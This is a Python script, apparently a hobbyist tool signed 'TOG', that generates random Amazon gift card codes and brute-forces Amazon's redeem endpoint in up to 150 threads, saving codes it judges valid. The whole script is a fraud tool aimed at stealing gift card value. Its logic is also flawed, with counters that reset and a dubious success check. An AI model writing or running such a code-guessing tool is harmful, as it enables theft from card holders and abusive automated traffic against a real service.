import requests, threading, time, ctypes, string, random, sys
from colorama import init, Fore
import os

def amazonapp():
    init(convert=True)
    ctypes.windll.kernel32.SetConsoleTitleW("Amazon Gen and Checker Made With Python By TOG6#6666")

    text = """
    ░█████╗░███╗░░░███╗░█████╗░███████╗░█████╗░███╗░░██╗  ░██████╗░███████╗███╗░░██╗  
    ██╔══██╗████╗░████║██╔══██╗╚════██║██╔══██╗████╗░██║  ██╔════╝░██╔════╝████╗░██║  
    ███████║██╔████╔██║███████║░░███╔═╝██║░░██║██╔██╗██║  ██║░░██╗░█████╗░░██╔██╗██║  
    ██╔══██║██║╚██╔╝██║██╔══██║██╔══╝░░██║░░██║██║╚████║  ██║░░╚██╗██╔══╝░░██║╚████║  
    ██║░░██║██║░╚═╝░██║██║░░██║███████╗╚█████╔╝██║░╚███║  ╚██████╔╝███████╗██║░╚███║  
    ╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚══╝  ░╚═════╝░╚══════╝╚═╝░░╚══╝  

    ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
    ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
    ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
    ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
    ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
    ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
    """

    print(Fore.WHITE + text)
    print(Fore.YELLOW + """
    [1] TO Generate Codes
    [2] To Check Codes
    """ + Fore.RESET)
    option = str(input("[?]: "))

    if option == '1':
        amount = int(input('Enter Amount of codes: '))
        fix = 0
        for i in range(amount):
            code = ('').join(random.choices(string.ascii_letters.upper() + string.digits.upper(), k=13))
            f = open('giftcards.txt','a')
            f.write(code.upper() + '\n')
            print(Fore.GREEN + code.upper())
            f.close()
            fix += 1
            ctypes.windll.kernel32.SetConsoleTitleW("Generated Codes: " + str(fix) + "/" + str(amount) + " | MADE BY TOGGG")
        time.sleep(2)
        os.system('cls')
        amazonapp()

    if option == '2':
        giftcards = []
        num = 0
        speed = (1/int(input("How Many Codes Per Second? [RECOMMENDED: 4]: ")))

        def checker():
            try:
                valid = 0
                invalid = 0
                kll = ('').join(random.choices(string.ascii_letters.upper() + string.digits.upper(), k=13)) 
                success_keyword = """ <b>Enter claim code</b> """
                r = requests.post("https://www.amazon.com/gc/redeem?ref_=gcui_b_e_r_c_d_b_w", data={"giftcard": kll})
                if success_keyword in r.text:
                    valid += 1
                    print(Fore.GREEN + 'WORKING GIFT CODES: ' + kll)
                    mkj = open('valid.txt', 'a')
                    mkj.write(kll)
                    mkj.close()
                    ctypes.windll.kernel32.SetConsoleTitleW("Amazon Checker | Checked: " + str(num) + "/" + str(len(giftcards)) + " | Valid: " + str(valid) + " | Invalid: " + str(invalid) + " | MADE BY TOG")
                else:
                    print(Fore.RED + 'INVALID GIFT CODES: ' + kll)
                    invalid += 1
                    ctypes.windll.kernel32.SetConsoleTitleW("Amazon Checker | Checked: " + str(num) + "/" + str(len(giftcards)) + " | Valid: " + str(valid) + " | Invalid: " + str(invalid) + " | MADE BY TOG")
            except IndexError as e:
                sys.exit(0)

        while True:
            if threading.active_count() < 150:
                threading.Thread(target=checker, args=()).start()
                time.sleep(speed)
                num+=1

amazonapp()